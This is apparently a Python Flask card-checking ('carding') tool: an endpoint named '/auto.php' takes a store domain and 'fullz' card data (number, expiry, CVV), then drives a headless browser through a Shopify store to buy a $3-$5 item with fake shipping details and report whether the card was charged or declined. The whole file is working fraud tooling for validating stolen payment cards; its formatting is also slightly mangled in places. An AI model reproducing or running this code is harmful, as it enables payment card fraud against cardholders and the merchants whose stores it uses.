from flask import Flask, request, jsonify import asyncio from playwright.async_api import async_playwright

app = Flask(name)

@app.route("/auto.php") def auto_charge(): domain = request.args.get("domain") fullz = request.args.get("fullz")

if not domain or not fullz:
    return jsonify({"error": "Missing domain or fullz"})

parts = fullz.split("|")
if len(parts) != 4:
    return jsonify({"error": "fullz must be CC|MM|YYYY|CVV"})

cc, mm, yy, cvv = parts
result = asyncio.run(shopify_charge(domain, cc, mm, yy, cvv))
return jsonify({"status": result})

async def shopify_charge(domain, cc, mm, yy, cvv): async with async_playwright() as p: browser = await p.chromium.launch(headless=True) page = await browser.new_page()

try:
        await page.goto(domain, timeout=60000)

        product_links = await page.query_selector_all("a[href*='/products/']")
        chosen_product = None

        for link in product_links:
            href = await link.get_attribute("href")
            if not href:
                continue
            product_url = domain.rstrip("/") + href
            try:
                await page.goto(product_url, timeout=30000)
                await page.wait_for_load_state("networkidle")

                price_el = await page.query_selector("span[class*='price'], .price")
                if price_el:
                    price_text = await price_el.inner_text()
                    price_text = price_text.replace("$", "").replace("USD", "").strip()
                    price = float(price_text)

                    if 3.0 <= price <= 5.0:
                        chosen_product = product_url
                        break
            except:
                continue

        if not chosen_product:
            await browser.close()
            return "No suitable product between $3-$5 found"

        await page.goto(chosen_product)

        add_button = await page.query_selector("form[action*='/cart/add'] button[type='submit']")
        if not add_button:
            await browser.close()
            return "Add to cart button not found"
        await add_button.click()
        await page.wait_for_load_state("networkidle")

        await page.goto(f"{domain}/cart")
        checkout_button = await page.query_selector("button[name='checkout']")
        if not checkout_button:
            await browser.close()
            return "Checkout button not found"
        await checkout_button.click()
        await page.wait_for_load_state("networkidle")

        await page.fill("input#checkout_email", "test@example.com")
        await page.fill("input#checkout_shipping_address_first_name", "John")
        await page.fill("input#checkout_shipping_address_last_name", "Doe")
        await page.fill("input#checkout_shipping_address_address1", "123 Test Street")
        await page.fill("input#checkout_shipping_address_city", "Test City")
        await page.fill("input#checkout_shipping_address_zip", "12345")
        await page.fill("input#checkout_shipping_address_phone", "1234567890")
        await page.click("button[name='button']")
        await page.wait_for_load_state("networkidle")
        await page.click("button[name='button']")
        await page.wait_for_load_state("networkidle")

        frames = page.frames
        card_frame = None
        for frame in frames:
            if "card-fields" in frame.url:
                card_frame = frame
                break

        if not card_frame:
            await browser.close()
            return "Card iframe not found"

        await card_frame.fill("input[name='number']", cc)
        await card_frame.fill("input[name='name']", "John Doe")
        await card_frame.fill("input[name='expiry']", f"{mm}/{yy[-2:]}")
        await card_frame.fill("input[name='verification_value']", cvv)

        await page.click("button[type='submit']")
        await page.wait_for_timeout(10000)
        content = await page.content()
        await browser.close()

        if "Thank you for your order" in content or "order is confirmed" in content:
            return "Charge Success"
        elif "card was declined" in content.lower():
            return "Card Declined"
        else:
            return "Payment Unknown"

    except Exception as e:
        await browser.close()
        return f"Error: {str(e)}"

if name == "main": app.run(host="0.0.0.0", port=5000)

